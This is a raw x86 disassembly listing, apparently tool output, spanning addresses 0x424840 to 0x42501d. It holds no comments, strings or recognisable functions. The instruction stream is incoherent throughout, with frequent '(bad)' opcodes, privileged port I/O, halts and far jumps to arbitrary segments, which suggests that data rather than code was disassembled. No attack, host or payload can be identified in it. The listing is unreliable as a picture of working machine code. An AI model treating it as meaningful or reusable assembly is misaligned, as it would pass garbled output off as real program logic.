  424840:	push   ds
  424841:	sub    DWORD PTR [esp+edi*8+0x10],esp
  424845:	jmp    0x424816
  424847:	(bad)  
  424848:	(bad)  [edi-0x6d]
  42484b:	sub    eax,0xe46074b8
  424850:	retf   
  424851:	jl     0x424847
  424853:	rep stos DWORD PTR es:[edi],eax
  424855:	jno    0x42484a
  424857:	jo     0x424842
  424859:	sub    al,0xb3
  42485b:	jl     0x4247e0
  42485d:	lahf   
  42485e:	repnz (bad) 
  424860:	adc    eax,0xfeed0d33
  424865:	mov    eax,ds:0x1986f507
  42486a:	mov    DWORD PTR [eax+0x5a],edx
  42486d:	fwait
  42486e:	sub    al,0x38
  424870:	xor    ah,BYTE PTR [ecx+0x36a0e009]
  424876:	sub    ah,BYTE PTR [ebp-0x1aa57dfb]
  42487c:	loope  0x424818
  42487e:	iret   
  42487f:	pusha  
  424880:	fcomp  QWORD PTR [eax]
  424882:	mov    ebx,0xb5011d62
  424887:	je     0x42487c
  424889:	and    eax,DWORD PTR [eax-0x19b3a83]
  42488f:	jmp    0x4248d3
  424891:	sbb    bl,BYTE PTR [esi]
  424893:	popa   
  424894:	sbb    DWORD PTR [ecx+0x5],ebp
  424897:	mov    ch,BYTE PTR [eax+0x3bbb275e]
  42489d:	lahf   
  42489e:	retf   
  42489f:	sbb    BYTE PTR [ecx+0x71e80384],al
  4248a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4248a6:	test   ah,cl
  4248a8:	pop    edx
  4248a9:	jg     0x424874
  4248ab:	fs cdq 
  4248ad:	ret    
  4248ae:	f2xm1  
  4248b0:	jl     0x4248bd
  4248b2:	cld    
  4248b3:	adc    ecx,DWORD PTR [eax]
  4248b5:	es inc ecx
  4248b7:	rcr    BYTE PTR [edx+0x24f253df],cl
  4248bd:	leave  
  4248be:	inc    ecx
  4248bf:	push   esi
  4248c0:	dec    edi
  4248c1:	push   edi
  4248c2:	mov    cl,0x2f
  4248c4:	mov    WORD PTR [esi+0x3069628b],ds
  4248ca:	ret    
  4248cb:	fs xor al,0xa2
  4248ce:	xor    BYTE PTR [edi],ah
  4248d0:	xor    esi,DWORD PTR [esi]
  4248d2:	mov    eax,0x75faf604
  4248d7:	pop    esp
  4248d8:	gs sub al,0x17
  4248db:	out    0xcf,eax
  4248dd:	(bad)  
  4248de:	adc    bl,cl
  4248e0:	rol    BYTE PTR [eax-0x6e4356df],cl
  4248e6:	mov    ebx,0xedf72c64
  4248eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4248ec:	adc    eax,0xb6e4f281
  4248f1:	push   cs
  4248f2:	scas   al,BYTE PTR es:[edi]
  4248f3:	fmul   QWORD PTR [ebp+0x59]
  4248f6:	dec    ebx
  4248f7:	outs   dx,BYTE PTR ds:[esi]
  4248f8:	out    0x27,eax
  4248fa:	lods   eax,DWORD PTR ds:[esi]
  4248fb:	push   ebx
  4248fc:	xor    al,BYTE PTR [ecx+0x68]
  4248ff:	in     eax,0x97
  424901:	jno    0x4248ae
  424903:	adc    BYTE PTR [esi-0x23fcf618],ah
  424909:	fild   QWORD PTR [ecx]
  42490b:	imul   ecx,DWORD PTR [ecx-0x1b38e3e7],0x18
  424912:	fs int 0xf
  424915:	scas   al,BYTE PTR es:[edi]
  424916:	cdq    
  424917:	repnz mov ebx,0x7dd51ba7
  42491d:	push   cs
  42491e:	mov    edi,DWORD PTR [eax+ebx*2]
  424921:	cs clc 
  424923:	outs   dx,DWORD PTR ds:[esi]
  424924:	lds    ebx,FWORD PTR [eax+0xde8f0a8]
  42492a:	cmp    al,0x5e
  42492c:	test   esi,esi
  42492e:	push   es
  42492f:	mov    ebp,0xfe06566d
  424934:	hlt    
  424935:	lock das 
  424937:	jo     0x424997
  424939:	push   ss
  42493a:	mov    ch,0xf4
  42493c:	adc    eax,0xc56d10e6
  424941:	shl    DWORD PTR [edx+0xb],0x15
  424945:	adc    ecx,edx
  424947:	out    dx,eax
  424948:	lds    esi,FWORD PTR [edi+0x692a0acc]
  42494e:	jne    0x424963
  424950:	(bad)  
  424951:	jo     0x4249c0
  424953:	push   cs
  424954:	arpl   ax,cx
  424956:	cwde   
  424957:	dec    esi
  424958:	fistp  DWORD PTR [ecx+0x252beada]
  42495e:	cs inc edi
  424960:	push   0x40f44d7f
  424965:	lock mov bh,0x94
  424968:	ja     0x4249c7
  42496a:	push   0x18bca613
  42496f:	fild   WORD PTR ds:0xd5da36d2
  424975:	pop    edi
  424976:	mov    edi,0x16f921a4
  42497b:	push   0x370880a5
  424980:	sub    ah,BYTE PTR [edx+0x51fac4cb]
  424986:	mov    WORD PTR [ebx-0x64],ss
  424989:	pop    ecx
  42498a:	add    eax,0xefd814f6
  42498f:	adc    al,0xb2
  424991:	sahf   
  424992:	jecxz  0x424a00
  424994:	mov    bl,0xff
  424996:	cld    
  424997:	out    0xe6,al
  424999:	ss cmp al,0xb2
  42499c:	push   ss
  42499d:	shr    esi,1
  42499f:	loopne 0x42492f
  4249a1:	(bad)  
  4249a2:	shl    BYTE PTR [esi-0x5962cb43],0xa0
  4249a9:	icebp  
  4249aa:	mov    ecx,0x3bcc8d70
  4249af:	popa   
  4249b0:	(bad)  
  4249b1:	int    0xe8
  4249b3:	and    bl,BYTE PTR [eax+ebx*1-0x36dc2e7c]
  4249ba:	sbb    eax,0x1c50d4d
  4249bf:	in     eax,0x44
  4249c1:	jl     0x4249e2
  4249c3:	fistp  WORD PTR ds:0x48636a9
  4249c9:	mov    eax,0x791679ac
  4249ce:	add    eax,0xe51518da
  4249d3:	dec    esp
  4249d4:	js     0x424980
  4249d6:	mov    ebx,0x440c1016
  4249db:	pop    es
  4249dc:	add    eax,0x1f3a2a9a
  4249e1:	dec    ecx
  4249e2:	push   0x80159814
  4249e7:	add    DWORD PTR [eax],ebx
  4249e9:	sub    esp,0xfbec680d
  4249ef:	jmp    0x72c9:0xe6178265
  4249f6:	fidivr WORD PTR [esp+ebx*1-0x34f1c4f7]
  4249fd:	addr16 sub al,0x97
  424a00:	and    BYTE PTR [edi+edx*4-0x74],dh
  424a04:	dec    ebp
  424a05:	mov    ecx,0xf2319a3a
  424a0a:	add    al,0xbd
  424a0c:	jb     0x4249d5
  424a0e:	daa    
  424a0f:	je     0x424a16
  424a11:	mov    al,ds:0x43c8f52a
  424a16:	cmp    ch,cl
  424a18:	les    ebx,FWORD PTR [eax-0x38]
  424a1b:	das    
  424a1c:	daa    
  424a1d:	jg     0x4249cf
  424a1f:	je     0x424a55
  424a21:	cld    
  424a22:	dec    ebp
  424a23:	mov    ds:0xba7ec037,eax
  424a28:	fst    QWORD PTR [eax+0x29]
  424a2b:	repz repnz sub al,0x87
  424a2f:	int    0x6b
  424a31:	je     0x424a40
  424a33:	gs and al,0x81
  424a36:	pop    es
  424a37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424a38:	ins    BYTE PTR es:[edi],dx
  424a39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424a3a:	retf   
  424a3b:	fwait
  424a3c:	or     ch,ch
  424a3e:	test   DWORD PTR [ebx],0xd843d435
  424a44:	mov    DWORD PTR [edi-0x48],0x98771a14
  424a4b:	inc    esp
  424a4c:	int3   
  424a4d:	call   0xa65c:0x607de58b
  424a54:	ret    0x7a5e
  424a57:	push   ecx
  424a58:	adc    eax,0x4c84ef25
  424a5d:	xchg   ebx,eax
  424a5e:	jl     0x424a77
  424a60:	and    cl,0x12
  424a63:	sahf   
  424a64:	leave  
  424a65:	jp     0x424a26
  424a67:	pop    eax
  424a68:	sbb    cl,BYTE PTR [ecx+0x3cb5e2cc]
  424a6e:	les    ebp,FWORD PTR [ecx-0x7d932a5b]
  424a74:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  424a76:	stos   DWORD PTR es:[edi],eax
  424a77:	(bad)  
  424a78:	les    ecx,FWORD PTR [esi+0x51156872]
  424a7e:	adc    BYTE PTR [edi-0x68],ah
  424a81:	int    0xba
  424a83:	in     al,0x1c
  424a85:	cwde   
  424a86:	fld    st(6)
  424a88:	xchg   ebp,eax
  424a89:	fnstenv [eax-0x5]
  424a8c:	mov    ecx,DWORD PTR [edx-0x5d625b7c]
  424a92:	inc    edx
  424a93:	call   0x64353194
  424a98:	xchg   ebp,eax
  424a99:	pushf  
  424a9a:	fucomip st,st(7)
  424a9c:	retf   0x3be1
  424a9f:	xchg   esi,eax
  424aa0:	sbb    ecx,DWORD PTR [ecx]
  424aa2:	mov    bl,0xe9
  424aa4:	div    BYTE PTR [ecx-0x5]
  424aa7:	std    
  424aa8:	jle    0x424a85
  424aaa:	dec    ebx
  424aab:	lock neg BYTE PTR [edx-0x79]
  424aaf:	loop   0x424a5e
  424ab1:	jl     0x424ae9
  424ab3:	jmp    0xda6f:0x1c8ec91d
  424aba:	lods   al,BYTE PTR ds:[esi]
  424abb:	cmp    eax,0xc6ba8d6
  424ac0:	inc    esp
  424ac1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424ac2:	sub    DWORD PTR [ebx+edi*4],ebp
  424ac5:	out    dx,eax
  424ac6:	mov    ebx,0xb80aebc9
  424acb:	std    
  424acc:	sub    eax,0xd7204cad
  424ad1:	xor    BYTE PTR [ebx],bl
  424ad3:	pop    eax
  424ad4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ad5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ad6:	cmp    esp,DWORD PTR [ecx]
  424ad8:	push   edx
  424ad9:	cli    
  424ada:	sub    ecx,DWORD PTR [esi+0x517c2745]
  424ae0:	std    
  424ae1:	(bad)  [esi-0x26364adc]
  424ae7:	cli    
  424ae8:	jbe    0x424ace
  424aea:	int3   
  424aeb:	aad    0x22
  424aed:	sbb    ecx,DWORD PTR [eax-0x14f4113a]
  424af3:	cmp    BYTE PTR [edi],dl
  424af5:	sub    eax,ecx
  424af7:	or     eax,DWORD PTR [ecx+0x61c09195]
  424afd:	ror    ebx,0xda
  424b00:	jne    0x424b35
  424b02:	shl    BYTE PTR [edi+0x3d83a0ee],cl
  424b08:	int    0x93
  424b0a:	mov    dh,0xa3
  424b0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424b0d:	mov    dh,0x20
  424b0f:	addr16 (bad) 
  424b12:	sbb    dl,cl
  424b14:	mov    DWORD PTR [edx],ebx
  424b16:	mov    edx,0xabc7aee7
  424b1b:	adc    edi,DWORD PTR [edi+esi*2+0x4a]
  424b1f:	pop    ecx
  424b20:	lea    esi,[ecx-0xa1df0cd]
  424b26:	gs out 0x9e,eax
  424b29:	xor    BYTE PTR [ebp+0x71],ch
  424b2c:	imul   ebp,DWORD PTR [esi-0x26dc4add],0x33
  424b33:	jmp    0x684:0x9cdba1cb
  424b3a:	mov    cl,0x8
  424b3c:	dec    ebp
  424b3d:	repnz sbb ah,0x8b
  424b41:	mov    bl,0x7d
  424b43:	jbe    0x424af3
  424b45:	lock mov ebx,0x749f1a20
  424b4b:	pusha  
  424b4c:	push   ebp
  424b4d:	jno    0x424b08
  424b4f:	in     eax,0xcd
  424b51:	jb     0x424adb
  424b53:	mov    ebx,0x591e991d
  424b58:	mov    DWORD PTR [edx],ecx
  424b5a:	stc    
  424b5b:	fiadd  WORD PTR ds:0x6b5f7b9a
  424b61:	bound  eax,QWORD PTR [edi-0x44974c10]
  424b67:	sub    ebp,DWORD PTR [esi]
  424b69:	mov    eax,ds:0x880b04b8
  424b6e:	pop    ebp
  424b6f:	mov    al,ds:0xe7cdbc75
  424b74:	(bad)  
  424b75:	jno    0x424b5a
  424b77:	loope  0x424b99
  424b79:	pop    ecx
  424b7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424b7b:	push   ecx
  424b7c:	mov    di,0xa7ac
  424b80:	in     al,0x2f
  424b82:	sub    al,0xd4
  424b84:	and    bl,BYTE PTR [esi]
  424b86:	dec    esp
  424b87:	sub    BYTE PTR [edx+0x24acb652],0xa9
  424b8e:	popf   
  424b8f:	aad    0x39
  424b91:	jl     0x424bbd
  424b93:	stos   BYTE PTR es:[edi],al
  424b94:	adc    DWORD PTR [ecx+0x51e2a58b],esp
  424b9a:	inc    edx
  424b9b:	mov    ebp,0x34b6194
  424ba0:	adc    DWORD PTR [eax+esi*4-0xc],0x90fcc4f0
  424ba8:	cmc    
  424ba9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424baa:	or     edx,DWORD PTR [edx+ecx*2+0x55]
  424bae:	pop    edi
  424baf:	in     al,dx
  424bb0:	add    ebp,DWORD PTR [eax-0x6cacfe73]
  424bb6:	mov    ah,0x74
  424bb8:	bound  edi,QWORD PTR [esp+eax*4]
  424bbb:	inc    edx
  424bbc:	cmc    
  424bbd:	lahf   
  424bbe:	or     ecx,DWORD PTR [esi]
  424bc0:	push   cs
  424bc1:	std    
  424bc2:	xor    BYTE PTR [esi-0x5],ah
  424bc5:	dec    edx
  424bc6:	push   ecx
  424bc7:	jl     0x424bfd
  424bc9:	stc    
  424bca:	(bad)  
  424bcb:	mov    ah,0xb8
  424bcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424bce:	sub    DWORD PTR [ebx-0x33d0fa4],ecx
  424bd4:	(bad)  
  424bd5:	aam    0xfc
  424bd7:	aaa    
  424bd8:	jb     0x424be7
  424bda:	or     BYTE PTR [eax-0xf961ca2],bh
  424be0:	sub    edi,DWORD PTR [ecx]
  424be2:	or     ch,BYTE PTR [edi]
  424be4:	fcmovnbe st,st(0)
  424be6:	mov    dh,0x68
  424be8:	xlat   BYTE PTR ds:[ebx]
  424be9:	dec    eax
  424bea:	scas   al,BYTE PTR es:[edi]
  424beb:	pop    ss
  424bec:	cmp    DWORD PTR [eax+ecx*1-0x4d5fb240],ebx
  424bf3:	cmp    al,0x73
  424bf5:	rcr    BYTE PTR [edi-0x78],cl
  424bf8:	jp     0x424b95
  424bfa:	push   DWORD PTR [esi+0x5591d0e]
  424c00:	adc    DWORD PTR gs:[ecx-0x137e1b7c],esi
  424c07:	out    0x22,eax
  424c09:	xchg   DWORD PTR [edx-0x75],ebx
  424c0c:	cli    
  424c0d:	fs mov dl,0x6e
  424c10:	pop    ss
  424c11:	jns    0x424c1e
  424c13:	xchg   edx,eax
  424c14:	pop    ds
  424c15:	inc    esi
  424c16:	xchg   ebp,eax
  424c17:	push   0x4a1ba3f7
  424c1c:	pop    eax
  424c1d:	es or  eax,0x347528e5
  424c23:	sbb    edi,DWORD PTR [esi]
  424c25:	pusha  
  424c26:	scas   al,BYTE PTR es:[edi]
  424c27:	xchg   ebp,eax
  424c28:	push   ebx
  424c29:	jbe    0x424c4b
  424c2b:	in     eax,dx
  424c2c:	adc    DWORD PTR [esi+0x3dd4d39b],esp
  424c32:	jo     0x424be5
  424c34:	call   0x416f219f
  424c39:	shl    BYTE PTR [edi-0x603bc1ec],0x6d
  424c40:	in     eax,0xfa
  424c42:	shl    bh,0x92
  424c45:	sti    
  424c46:	pop    eax
  424c47:	mov    BYTE PTR [esi],bl
  424c49:	test   eax,0xd46c7554
  424c4e:	xchg   BYTE PTR [edx-0x29],cl
  424c51:	retf   0x18cb
  424c54:	repnz push eax
  424c56:	repnz and esp,DWORD PTR [esi-0x349bfa2b]
  424c5d:	xchg   edx,eax
  424c5e:	pop    es
  424c5f:	out    0xb,eax
  424c61:	inc    ebx
  424c62:	mov    cl,0x64
  424c64:	repz mov WORD PTR [ebp-0x63f5c299],?
  424c6b:	iret   
  424c6c:	xchg   esp,eax
  424c6d:	retf   0x6873
  424c70:	repnz fistp WORD PTR [edi-0x426e31a]
  424c77:	scas   al,BYTE PTR es:[edi]
  424c78:	test   edx,ecx
  424c7a:	xchg   BYTE PTR [eax],dh
  424c7c:	in     al,0xa6
  424c7e:	fwait
  424c7f:	loope  0x424c88
  424c81:	push   es
  424c82:	sub    BYTE PTR [ecx-0x3f],al
  424c85:	sub    edx,DWORD PTR [ecx+ebp*1-0x2b432232]
  424c8c:	mov    eax,ds:0xa50ea9f3
  424c91:	xor    bl,BYTE PTR [ebx-0x16]
  424c94:	stc    
  424c95:	pusha  
  424c96:	das    
  424c97:	jle    0x424cb6
  424c99:	imul   ebx,DWORD PTR [edx-0x330624a8],0x8f2df0c1
  424ca3:	xor    cl,BYTE PTR ds:0x1b05c512
  424ca9:	and    esi,DWORD PTR [ebp+0x5f]
  424cac:	stc    
  424cad:	jb     0x424cdc
  424caf:	shl    DWORD PTR [edi],cl
  424cb1:	sahf   
  424cb2:	mov    eax,0x7d523ee4
  424cb7:	in     eax,0xb7
  424cb9:	loopne 0x424c49
  424cbb:	fst    DWORD PTR ds:0xf0e9a5bc
  424cc1:	ja     0x424c84
  424cc3:	sar    BYTE PTR [edi],1
  424cc5:	jo     0x424c75
  424cc7:	in     eax,0x37
  424cc9:	cmp    esi,DWORD PTR [ebx+0x2bd094ea]
  424ccf:	jmp    0x4222:0xe01c854a
  424cd6:	lods   al,BYTE PTR ds:[esi]
  424cd7:	retf   
  424cd8:	and    al,0xd9
  424cda:	jecxz  0x424d0d
  424cdc:	dec    eax
  424cdd:	fld    QWORD PTR [edi]
  424cdf:	inc    ebp
  424ce0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424ce1:	mov    ds:0xc805b7fb,eax
  424ce6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ce7:	stc    
  424ce8:	jecxz  0x424cfc
  424cea:	push   esi
  424ceb:	or     eax,0xc4bb44ed
  424cf0:	pop    eax
  424cf1:	stc    
  424cf2:	sahf   
  424cf3:	pop    ds
  424cf4:	js     0x424cda
  424cf6:	sub    edx,esi
  424cf8:	inc    ebx
  424cf9:	popf   
  424cfa:	push   ebx
  424cfb:	sbb    DWORD PTR [eax+0x13],ecx
  424cfe:	mov    ch,0x74
  424d00:	mov    dh,0xa1
  424d02:	xchg   esi,eax
  424d03:	mov    ecx,0xec95ab25
  424d08:	inc    BYTE PTR [ebx]
  424d0a:	xor    DWORD PTR [eax+eiz*4+0x5d],0xffffffed
  424d0f:	pusha  
  424d10:	in     eax,0xac
  424d12:	scas   al,BYTE PTR es:[edi]
  424d13:	repz adc al,0x6a
  424d16:	mov    ecx,0xde0e45c8
  424d1b:	in     al,dx
  424d1c:	cs (bad) 
  424d1e:	or     DWORD PTR [ebx-0x1822e311],ebp
  424d24:	cmc    
  424d25:	punpckhbw mm7,mm6
  424d28:	cmp    bh,ch
  424d2a:	ret    0x9238
  424d2d:	dec    edi
  424d2e:	mov    edi,0x9936975a
  424d33:	push   eax
  424d34:	inc    ecx
  424d35:	call   0x3bd7:0x8d2386a7
  424d3c:	sbb    eax,0x2cf5eb09
  424d41:	das    
  424d42:	dec    ecx
  424d43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424d44:	cmp    esp,DWORD PTR [edi-0x249c2fe5]
  424d4a:	adc    BYTE PTR [esp+edi*1-0xb6069d6],0x49
  424d52:	mov    edi,0xb8a20874
  424d57:	mov    bh,0x85
  424d59:	xor    edi,DWORD PTR [esi-0x13]
  424d5c:	mov    bh,0x57
  424d5e:	sbb    al,0x7f
  424d60:	sbb    edi,DWORD PTR [ecx]
  424d62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d63:	data16 lods al,BYTE PTR ds:[esi]
  424d65:	mov    ah,0x14
  424d67:	imul   esi,DWORD PTR [ebp-0x66],0x170879db
  424d6e:	cdq    
  424d6f:	(bad)  
  424d70:	xor    eax,0x62fb849d
  424d75:	inc    ebp
  424d76:	pop    ds
  424d77:	(bad)  
  424d78:	loop   0x424d1c
  424d7a:	mov    edx,0xfb9e3b64
  424d7f:	xchg   ebx,eax
  424d80:	(bad)  
  424d81:	iret   
  424d82:	mov    ch,0xf5
  424d84:	mov    esp,0x8552d507
  424d89:	xor    BYTE PTR [edx-0x78a2140c],0x50
  424d90:	vpsubusw ymm4,ymm1,ymm7
  424d94:	shl    ah,cl
  424d96:	cmp    al,0x2
  424d98:	sbb    BYTE PTR [ecx],ch
  424d9a:	mov    ds:0x7e18f66d,al
  424d9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424da0:	jg     0x424d8f
  424da2:	jmp    0x424e05
  424da4:	loopne 0x424df2
  424da6:	and    bh,BYTE PTR [edx-0x1aede0ff]
  424dac:	pop    ss
  424dad:	mov    al,ds:0xe67519c8
  424db2:	mov    ebx,0x308b7d44
  424db7:	sbb    BYTE PTR [ebp+0x35ec8298],dh
  424dbd:	mov    edi,0x95225ac
  424dc2:	es push cs
  424dc4:	and    BYTE PTR [edi-0x61],0x81
  424dc8:	mov    edi,0x75f08f86
  424dcd:	cmp    al,0xec
  424dcf:	in     eax,0x5b
  424dd1:	aad    0xd
  424dd3:	dec    ecx
  424dd4:	and    al,0x69
  424dd6:	js     0x424dd2
  424dd8:	sbb    al,0x9c
  424dda:	cdq    
  424ddb:	add    dh,BYTE PTR [ecx]
  424ddd:	sbb    al,0x35
  424ddf:	jb     0x424d96
  424de1:	and    BYTE PTR [edi-0xe],bl
  424de4:	xchg   BYTE PTR [edx+edx*2+0x61791df7],cl
  424deb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424dec:	retf   0x57
  424def:	repnz repnz pop ss
  424df2:	jl     0x424d88
  424df4:	mov    edi,0x221b8ecb
  424df9:	mov    cl,0x86
  424dfb:	test   BYTE PTR [ebx-0x6a5689f6],dl
  424e01:	std    
  424e02:	mov    bh,0x94
  424e04:	aaa    
  424e05:	mov    al,ds:0xde55e371
  424e0a:	jge    0x424df9
  424e0c:	mov    ds:0x912e70a7,eax
  424e11:	stc    
  424e12:	sbb    BYTE PTR [ebp-0x62],cl
  424e15:	cmp    bh,ah
  424e17:	jmp    0x50f6bc85
  424e1c:	aaa    
  424e1d:	retf   
  424e1e:	lds    ebp,FWORD PTR [eax+0x76]
  424e21:	jmp    0x424dfe
  424e23:	nop
  424e24:	mov    WORD PTR [ecx],ds
  424e26:	and    BYTE PTR [esi],0xa5
  424e29:	mov    ds:0x95b9a943,eax
  424e2e:	adc    ecx,eax
  424e30:	aad    0x71
  424e32:	dec    esi
  424e33:	out    dx,al
  424e34:	add    eax,DWORD PTR [ecx-0x66dfce50]
  424e3a:	or     BYTE PTR [eax+0x33],0xd1
  424e3e:	pop    edx
  424e3f:	inc    esp
  424e40:	popf   
  424e41:	pusha  
  424e42:	mov    ebp,0xe7a80d53
  424e47:	xor    DWORD PTR [edx+0x1b036c0c],0x4e79c249
  424e51:	xchg   ecx,eax
  424e52:	aam    0x8
  424e54:	rcr    ebp,cl
  424e56:	or     esi,DWORD PTR [edi]
  424e58:	add    dh,bh
  424e5a:	lahf   
  424e5b:	pop    ebp
  424e5c:	and    BYTE PTR [ecx+0xf7cd11e],cl
  424e62:	jge    0x424e87
  424e64:	mov    bh,0x5a
  424e66:	mov    dl,0xd2
  424e68:	jns    0x424ede
  424e6a:	jl     0x424e5a
  424e6c:	(bad)  
  424e6d:	fild   DWORD PTR [eax*4+0x361f0afa]
  424e74:	fld    QWORD PTR [esi]
  424e76:	mov    edx,0x7ba3ed84
  424e7b:	and    BYTE PTR [esi-0x6b],dl
  424e7e:	and    eax,0xed7e9d51
  424e83:	add    eax,DWORD PTR [edx-0x75]
  424e86:	mov    edx,0x33b114e4
  424e8b:	popa   
  424e8c:	es dec ebx
  424e8e:	ja     0x424eab
  424e90:	sub    DWORD PTR [edx+0x13],esi
  424e93:	mov    edi,0x92b11abe
  424e98:	cmp    al,0x9
  424e9a:	mov    ebx,0xd29791e4
  424e9f:	jns    0x424e86
  424ea1:	or     eax,0x91e5ecdf
  424ea6:	jne    0x424ee8
  424ea8:	sbb    DWORD PTR [ecx],ebx
  424eaa:	sub    al,0x77
  424eac:	mov    dh,0xf2
  424eae:	push   ecx
  424eaf:	adc    esi,esi
  424eb1:	mov    ds:0xc4d7b79b,eax
  424eb6:	pop    edi
  424eb7:	adc    DWORD PTR [edi+0x731c9933],edx
  424ebd:	xchg   ebx,eax
  424ebe:	mov    dl,0x14
  424ec0:	(bad)  
  424ec1:	out    dx,al
  424ec2:	scas   eax,DWORD PTR es:[edi]
  424ec3:	out    0xb5,al
  424ec5:	jge    0x424f14
  424ec7:	out    dx,eax
  424ec8:	or     ah,ah
  424eca:	lock dec edi
  424ecc:	push   ss
  424ecd:	mov    DWORD PTR [esi],edi
  424ecf:	(bad)  
  424ed0:	mov    edi,0xb867bd93
  424ed5:	cli    
  424ed6:	repnz or BYTE PTR [ebp+ebx*4-0x25],dh
  424edb:	out    dx,al
  424edc:	outs   dx,DWORD PTR ds:[esi]
  424edd:	(bad)  
  424ede:	mov    eax,ds:0x825cb78f
  424ee3:	cmp    al,0x1c
  424ee5:	aas    
  424ee6:	mov    bh,0x54
  424ee8:	mov    dl,0xf4
  424eea:	repz leave 
  424eec:	xchg   ebp,eax
  424eed:	push   0xf560e63d
  424ef2:	ficom  DWORD PTR [ebx+0x1d]
  424ef5:	dec    ecx
  424ef6:	inc    esi
  424ef7:	pop    esp
  424ef8:	js     0x424ed0
  424efa:	cmp    esi,DWORD PTR [ecx-0x3b]
  424efd:	mov    dl,0xab
  424eff:	mov    cs,WORD PTR [ebp+0x161c1479]
  424f05:	adc    al,BYTE PTR [edi+edx*8]
  424f08:	add    DWORD PTR [ebp+ebx*8-0xf],eax
  424f0c:	jns    0x424ea6
  424f0e:	mov    ecx,0xae779b0
  424f13:	lahf   
  424f14:	inc    ecx
  424f15:	sti    
  424f16:	mov    dh,0xfc
  424f18:	pop    ds
  424f19:	jp     0x424f19
  424f1b:	dec    ebp
  424f1c:	(bad)  
  424f1d:	jg     0x424ed5
  424f1f:	fs jns 0x424f11
  424f22:	retf   
  424f23:	dec    esp
  424f24:	mov    ch,0x92
  424f26:	mov    ah,ch
  424f28:	lods   al,BYTE PTR ds:[esi]
  424f29:	xchg   DWORD PTR [edi+0x2c],ebx
  424f2c:	mov    ecx,DWORD PTR [ecx-0x65e4a7bd]
  424f32:	sbb    ebp,0x60
  424f35:	clc    
  424f36:	mov    ch,0x7b
  424f38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f39:	mov    eax,ds:0xbd1cd22d
  424f3e:	lahf   
  424f3f:	loopne 0x424ee2
  424f41:	dec    ebp
  424f42:	lahf   
  424f43:	ss add eax,0xd96689a3
  424f49:	je     0x424f05
  424f4b:	loopne 0x424f36
  424f4d:	jg     0x424efb
  424f4f:	inc    ecx
  424f50:	mov    al,0xcf
  424f52:	jmp    0x424ed7
  424f54:	sar    DWORD PTR [edi],cl
  424f56:	mov    ch,0x3c
  424f58:	sbb    ecx,edi
  424f5a:	mov    ecx,0x173247c6
  424f5f:	xchg   BYTE PTR [ebx-0x5d],al
  424f62:	or     esi,DWORD PTR [ebp+ebp*1+0x1711f8d6]
  424f69:	fidivr DWORD PTR [edi-0x37]
  424f6c:	js     0x424fd5
  424f6e:	xchg   ebp,eax
  424f6f:	arpl   WORD PTR [edx+0x4514b6e6],di
  424f75:	rol    ebx,cl
  424f77:	fnstenv [ebp+0x47f32f41]
  424f7d:	add    eax,0xd0c0564
  424f82:	shr    DWORD PTR [ebx+0x5d],cl
  424f85:	mov    ah,0x15
  424f87:	jmp    0xf1148c73
  424f8c:	xor    eax,0x522c3ba8
  424f91:	dec    ebp
  424f92:	xchg   esi,eax
  424f93:	mov    cs,WORD PTR [edx+0x26]
  424f96:	cmc    
  424f97:	outs   dx,BYTE PTR ds:[esi]
  424f98:	clc    
  424f99:	idiv   BYTE PTR [esi+esi*4]
  424f9c:	out    dx,al
  424f9d:	jno    0x424f7c
  424f9f:	(bad)  
  424fa0:	test   al,0xa5
  424fa2:	(bad)  
  424fa3:	sub    al,BYTE PTR [edi]
  424fa5:	loop   0x424f8b
  424fa7:	add    al,0x1e
  424fa9:	sub    ecx,edx
  424fab:	push   eax
  424fac:	test   BYTE PTR [eax+0x0],bh
  424faf:	ror    ch,0xa1
  424fb2:	jmp    0x424fd0
  424fb4:	leave  
  424fb5:	test   al,0xcd
  424fb7:	sbb    cl,BYTE PTR [ebp+0x4b]
  424fba:	push   ebx
  424fbb:	mov    ch,0x30
  424fbd:	je     0x424f78
  424fbf:	fs or  al,0x3f
  424fc2:	int    0xb7
  424fc4:	test   DWORD PTR [ecx-0x12fc0d59],ebp
  424fca:	sbb    eax,0xc5093306
  424fcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424fd0:	call   DWORD PTR [ebx+0x4]
  424fd3:	add    eax,0xab533774
  424fd8:	jno    0x424f82
  424fda:	jnp    0x424fee
  424fdc:	mov    WORD PTR [esi],ds
  424fde:	(bad)  
  424fdf:	icebp  
  424fe0:	lds    esp,FWORD PTR [ecx-0x52]
  424fe3:	lods   eax,DWORD PTR ds:[esi]
  424fe4:	(bad)  
  424fe5:	lahf   
  424fe6:	jnp    0x425000
  424fe8:	xor    ah,BYTE PTR [edx]
  424fea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424feb:	aam    0x95
  424fed:	leave  
  424fee:	cmp    edx,DWORD PTR [ecx+0x7fc6d796]
  424ff4:	lahf   
  424ff5:	and    BYTE PTR fs:[esi-0x4189c4a1],al
  424ffc:	add    eax,0xc19c7c9b
  425001:	retf   0x906b
  425004:	or     al,0x1c
  425006:	cdq    
  425007:	jns    0x424ff7
  425009:	mov    ah,0xe3
  42500b:	outs   dx,DWORD PTR ds:[esi]
  42500c:	gs push edi
  42500e:	loop   0x424ff7
  425010:	neg    esp
  425012:	call   0xda79:0xcfa9161f
  425019:	jl     0x424fd9
  42501b:	into   
  42501c:	iret   
  42501d:	fwait
